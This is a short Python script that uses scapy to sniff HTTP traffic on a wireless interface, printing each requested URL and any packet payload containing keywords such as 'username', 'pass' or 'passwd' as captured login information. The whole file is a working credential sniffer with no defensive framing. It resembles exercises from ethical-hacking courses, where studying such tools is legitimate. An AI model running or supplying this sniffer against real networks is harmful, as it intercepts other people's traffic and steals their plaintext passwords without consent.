#!/usr/bin/python
import scapy.all as scapy
from scapy.layers import http
def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # , filter="tcp"

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in str(load):
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print(f"----------------------URL----------------------\n{url}")   
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n\n---------------------Login------------------\n{login_info}\n\n\n")
    # print(packet)




keywords = ["username", "user", "pass", "password", "login", "uname", "passwd"]
sniffer("wlp4s0")
